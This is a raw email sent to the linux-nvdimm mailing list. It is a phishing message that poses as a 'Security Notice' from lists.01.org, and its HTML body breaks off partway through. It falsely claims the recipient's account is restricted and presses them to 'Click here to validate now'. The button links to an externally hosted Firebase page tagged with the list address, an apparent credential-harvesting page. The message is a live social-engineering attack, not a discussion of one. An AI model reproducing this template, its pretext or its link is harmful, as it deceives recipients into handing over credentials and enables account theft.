Return-Path: <linux-nvdimm-bounces@lists.01.org>
X-Original-To: lists+linux-nvdimm@lfdr.de
Delivered-To: lists+linux-nvdimm@lfdr.de
Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 07203250EBF
	for <lists+linux-nvdimm@lfdr.de>; Tue, 25 Aug 2020 04:12:07 +0200 (CEST)
Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
	by ml01.01.org (Postfix) with ESMTP id D9FE013809E99;
	Mon, 24 Aug 2020 19:12:05 -0700 (PDT)
Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=104.168.243.197; helo=mail0.lifelinesolutionyt.xyz; envelope-from=admin@lifelinesolutionyt.xyz; receiver=<UNKNOWN> 
Received: from mail0.lifelinesolutionyt.xyz (hwsrv-767647.hostwindsdns.com [104.168.243.197])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits))
	(No client certificate requested)
	by ml01.01.org (Postfix) with ESMTPS id 8CA45135A9B0F
	for <linux-nvdimm@lists.01.org>; Mon, 24 Aug 2020 19:12:00 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=lifelinesolutionyt.xyz;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=admin@lifelinesolutionyt.xyz;
 bh=cb3k0JnzXO94o/fmxmK6CCsF60Tl0BiSvdECqxhDh3U=;
 b=UtccqiP+4A+jEIakG/OeYU06w0EMRxn6gGSYPcgdp6NqM8HxPNc5RV9BjaAcA0UMXTxW5T31O4ZS
   VThwscZqBgmHjGRl0/y3YDhs6aKbuuOO/o9B9PRtVcK8ABAQ2b2amuGWBOzzk03ytcQ1YnD9Ybz8
   jn+HtgvxrZjFS9QVNDQ=
From: Security Notice <admin@lifelinesolutionyt.xyz>
To: linux-nvdimm@lists.01.org
Subject: linux-nvdimm@lists.01.org Security Notice: fix security info now
Date: 25 Aug 2020 02:11:49 -0700
Message-ID: <20200825021149.F1EB602707B460AB@lifelinesolutionyt.xyz>
MIME-Version: 1.0
Message-ID-Hash: KIPH25ZAT6WEMB3HXZSFVO6YKWDTUEZN
X-Message-ID-Hash: KIPH25ZAT6WEMB3HXZSFVO6YKWDTUEZN
X-MailFrom: admin@lifelinesolutionyt.xyz
X-Mailman-Rule-Hits: nonmember-moderation
X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
X-Mailman-Version: 3.1.1
Precedence: list
List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/KIPH25ZAT6WEMB3HXZSFVO6YKWDTUEZN/>
List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
List-Post: <mailto:linux-nvdimm@lists.01.org>
List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
Content-Type: multipart/mixed; boundary="===============0464005944094961988=="

--===============0464005944094961988==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; BORDER-TOP: medium=
 none; FONT-FAMILY: Arial, Helvetica, Verdana, sans-serif; BORDER-RIGHT: me=
dium none; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collaps=
e; BORDER-BOTTOM: medium none; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
R: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: medium none; ORPHANS: 2; WI=
DOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: =
normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
tion-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=
=3Dcenter border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" width=3D"100%" align=3D=
center>
<TABLE class=3Dtopline style=3D"BOX-SIZING: border-box; BORDER-TOP: medium =
none; BORDER-RIGHT: medium none; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: =
medium none; FLOAT: right; BORDER-LEFT: medium none" height=3D4 cellSpacing=
=3D0 cellPadding=3D0 width=3D"100%" align=3Dcenter bgColor=3D#004788 border=
=3D0>
<TBODY>
<TR class=3Dlinefix style=3D"FONT-SIZE: 1px; LINE-HEIGHT: 0">
<TD class=3D"topline linefix" style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px;=
 PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px" h=
eight=3D4 width=3D"100%">&nbsp;</TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" width=3D"100%" align=3D=
center>
<TABLE style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIG=
HT: medium none; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; BOR=
DER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=
=3Dcenter bgColor=3D#ffffff border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(2=
55,255,255)" width=3D"100%" align=3Dcenter>
<TABLE class=3Dpage style=3D"BOX-SIZING: border-box; BORDER-TOP: medium non=
e; BORDER-RIGHT: medium none; WIDTH: 682px; BACKGROUND: none transparent sc=
roll repeat 0% 0%; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; B=
ORDER-LEFT: medium none; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 =
width=3D320 align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dleft>
<TABLE class=3D"w620 w940" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 align=3Dleft border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px">
<TABLE class=3Dflap style=3D"BOX-SIZING: content-box; OVERFLOW: hidden; BOR=
DER-TOP: rgb(0,71,136) 1px solid; BORDER-RIGHT: rgb(0,71,136) 1px solid; BO=
RDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(0,71,136) 1px solid; BORDER-LEF=
T: rgb(0,71,136) 1px solid; DISPLAY: inline-block; BACKGROUND-COLOR: rgb(0,=
71,136); border-radius: 0px 0px 4px 4px" cellSpacing=3D0 cellPadding=3D0 al=
ign=3Dleft bgColor=3D#004788 border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" width=3D9><A style=3D"T=
EXT-DECORATION: none; COLOR: rgb(34,105,195); OUTLINE-WIDTH: 0px; OUTLINE-S=
TYLE: none; OUTLINE-COLOR: invert" href=3D"https://www.mail.com/" target=3D=
_blank>
<IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-B=
OTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIG=
HT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=
=3D9 height=3D9></A></TD>
<TD style=3D"FONT-SIZE: 13px; TEXT-DECORATION: none; VERTICAL-ALIGN: middle=
; WHITE-SPACE: nowrap; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dmiddle align=3Dcenter=
><STRONG><A href=3D"https://www.mail.com/"><FONT color=3D#ffffff><SPAN styl=
e=3D"FONT-SIZE: 16px; FONT-FAMILY: DroidSans, Arial, Verdana, sans-serif">l=
ists.01.org</SPAN></FONT></A></STRONG>
 <A style=3D"TEXT-DECORATION: none; COLOR: rgb(34,105,195); OUTLINE-WIDTH: =
0px; OUTLINE-STYLE: none; OUTLINE-COLOR: invert" href=3D"https://www.mail.c=
om/" target=3D_blank><SPAN style=3D"POSITION: relative; TOP: -1px"><STRONG>=
&nbsp;</STRONG><FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMI=
LY: DroidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#ffff=
ff size=3D2 face=3DArial,Helvetica,Verdana,sans-serif>&nbsp;Service</FONT><=
/SPAN></A></TD>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" width=3D9><A style=3D"T=
EXT-DECORATION: none; COLOR: rgb(34,105,195); OUTLINE-WIDTH: 0px; OUTLINE-S=
TYLE: none; OUTLINE-COLOR: invert" href=3D"https://www.mail.com/" target=3D=
_blank>
<IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-B=
OTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIG=
HT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=
=3D9 height=3D9></A></TD></TR>
<TR height=3D2>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
2 vAlign=3Dtop colSpan=3D5><A style=3D"TEXT-DECORATION: none; COLOR: rgb(34=
,105,195); OUTLINE-WIDTH: 0px; OUTLINE-STYLE: none; OUTLINE-COLOR: invert" =
href=3D"https://www.mail.com/" target=3D_blank>
<IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-B=
OTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIG=
HT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=
=3D50 height=3D2></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<TABLE style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIG=
HT: medium none; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; BOR=
DER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D300 border=
=3D0>
<TBODY>
<TR height=3D22>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
22><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDE=
R-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-H=
EIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" widt=
h=3D1 height=3D22></TD></TR></TBODY></TABLE>
<TABLE class=3D"w620 w940" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 align=3Dleft border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px">
<TABLE class=3D"w620 w940" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 border=3D0>
<TBODY>
<TR>
<TD class=3Dmso-font-2 style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDI=
NG-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px">
<P align=3Dright><FONT class=3Dmso-font-6 style=3D"FONT-SIZE: 40px; FONT-FA=
MILY: DroidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 48px" color=3D#00=
4788 size=3D6 face=3DArial,Helvetica,Verdana,sans-serif>Security Notice</FO=
NT></P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD></TR>
</TBODY></TABLE></TD></TR>
<TR height=3D40>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
40><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDE=
R-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-H=
EIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" widt=
h=3D1 height=3D40></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; BORDER-TOP: medium=
 none; FONT-FAMILY: Arial, Helvetica, Verdana, sans-serif; BORDER-RIGHT: me=
dium none; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collaps=
e; BORDER-BOTTOM: medium none; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
R: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: medium none; ORPHANS: 2; WI=
DOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
NDENT: 0px; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=
=3D0 width=3D"100%" align=3Dcenter bgColor=3D#ffffff border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(2=
55,255,255)" width=3D"100%" align=3Dcenter>
<TABLE class=3Dpage style=3D"BOX-SIZING: border-box; BORDER-TOP: medium non=
e; BORDER-RIGHT: medium none; WIDTH: 682px; BACKGROUND: none transparent sc=
roll repeat 0% 0%; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; B=
ORDER-LEFT: medium none; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 =
width=3D320 align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dleft>
<TABLE class=3D"w620 w780" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 align=3Dleft border=3D0>
<TBODY>
<TR>
<TD class=3D"w620 w780" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 620px !importa=
nt; WIDTH: 620px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dleft>
<TABLE class=3D"w620 w780" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 620p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 78=
0px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 border=
=3D0>
<TBODY>
<TR>
<TD class=3Dmso-font-2 style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDI=
NG-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px"><FON=
T class=3Dmso-font-3 style=3D"FONT-FAMILY: DroidSans, Arial, Verdana, sans-=
serif; LINE-HEIGHT: 28px" color=3D#515151 size=3D3 face=3DArial,Helvetica,V=
erdana,sans-serif>Dear lists.01.org member,</FONT>
<FONT class=3Dmso-font-3 style=3D"FONT-SIZE: 20px; FONT-FAMILY: DroidSans, =
Arial, Verdana, sans-serif; LINE-HEIGHT: 28px" color=3D#515151 size=3D3 fac=
e=3DArial,Helvetica,Verdana,sans-serif><BR></FONT></TD></TR>
<TR height=3D8>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
8><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER=
-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HE=
IGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=
=3D1 height=3D8></TD></TR>
<TR>
<TD class=3D"mso-font-2 mso-w600" style=3D"FONT-SIZE: 13px; PADDING-BOTTOM:=
 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT=
: 0px" vAlign=3Dtop width=3D780 align=3Dleft>
<FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMILY: DroidSans, =
Arial, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2;=
 LETTER-SPACING: normal; LINE-HEIGHT: 24px; BACKGROUND-COLOR: rgb(255,255,2=
55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text=
-decoration-color: initial" color=3D#515151 size=3D2=20
face=3DArial,Helvetica,Verdana,sans-serif>As a precautionary measure&nbsp;<=
STRONG>we have restricted access to your account until your validate has be=
en changed</STRONG>&nbsp;. To prevent further irregular activity, you will =
be unable to send out any emails until this issue has been resolved</FONT>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, Verdana, sans-s=
erif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
IGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LE=
TTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-style: initial; text-decoration-color: ini=
tial">
<FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMILY: DroidSans, =
Arial, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#515151 size=3D2 fac=
e=3DArial,Helvetica,Verdana,sans-serif>To fix security info, click below to=
 validate.</FONT></P>
<P><FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMILY: Arial; L=
INE-HEIGHT: 24px" color=3D#515151 size=3D2 face=3DArial,Helvetica,Verdana,s=
ans-serif></FONT>&nbsp;</P>
<P><FONT color=3D#515151><SPAN style=3D"FONT-SIZE: 16px; FONT-FAMILY: Droid=
Sans, Arial, Verdana, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
; </SPAN></FONT>
<a onclick=3D"return window.theMainWindow.showLinkWarning(this)" class=3D"y=
iv0110503896m_-3040784390470120874m_-6709928446111310057gmail-m_30803100421=
29598068m_-1843232425470222725m_-5300258751701645845m_-8121842554626777045g=
mail-m_-2784047169813855445mlContentButton_mailru_css_attribute_postfix" st=
yle=3D"FONT-SIZE: 15px; TEXT-DECORATION: none; FONT-FAMILY: Arial, Helvetic=
a, sans-serif; WIDTH: 255px; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); PA=
DDING-BOTTOM: 15px; TEXT-ALIGN: center; PADDING-TOP:=20
15px; PADDING-LEFT: 0px; DISPLAY: inline-block; LINE-HEIGHT: 21px; PADDING-=
RIGHT: 0px; BACKGROUND-COLOR: rgb(0,161,84); border-radius: 2px" rel=3D"nor=
eferrer" target=3D"_blank" href=3D"https://firebasestorage.googleapis.com/v=
0/b/anyi-8ca3e.appspot.com/o/vibindex.html?alt=3Dmedia&token=3D38f5cc15-578=
7-44ae-a7d9-5b864f5618a7#linux-nvdimm@lists.01.org">Click here to validate =
now</a></P>
<P align=3Dcenter><FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-F=
AMILY: DroidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#5=
15151 size=3D2 face=3DArial,Helvetica,Verdana,sans-serif><BR><BR></FONT>
<SPAN style=3D"FONT-SIZE: 16px; FONT-FAMILY: DroidSans, Arial, Verdana, san=
s-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
T: none; FONT-WEIGHT: 400; COLOR: rgb(81,81,81); FONT-STYLE: normal; ORPHAN=
S: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGR=
OUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-style: initial; text-decoration-color:=20
initial">If you usually access your emails via an email or a third-party pr=
ogram, please click above to validate your account via the lists.01.org hom=
epage. You will then automatically validate your account.&nbsp;</SPAN><FONT=
 class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMILY: DroidSans, Arial=
, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#515151 size=3D2 face=3DA=
rial,Helvetica,Verdana,sans-serif><BR><BR>
To ensure your account is protected at all times, we ask you to complete th=
e following </FONT></P>
<P align=3Dcenter><FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-F=
AMILY: DroidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#5=
15151 size=3D2 face=3DArial,Helvetica,Verdana,sans-serif>steps:</FONT></P><=
/TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD></TR>
</TBODY></TABLE></TD></TR>
<TR height=3D25>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
25><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDE=
R-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-H=
EIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" widt=
h=3D1 height=3D25></TD></TR></TBODY></TABLE>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; BORDER-TOP: medium=
 none; FONT-FAMILY: Arial, Helvetica, Verdana, sans-serif; BORDER-RIGHT: me=
dium none; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collaps=
e; BORDER-BOTTOM: medium none; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
R: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: medium none; ORPHANS: 2; WI=
DOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
NDENT: 0px; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=
=3D0 width=3D"100%" align=3Dcenter bgColor=3D#ffffff border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
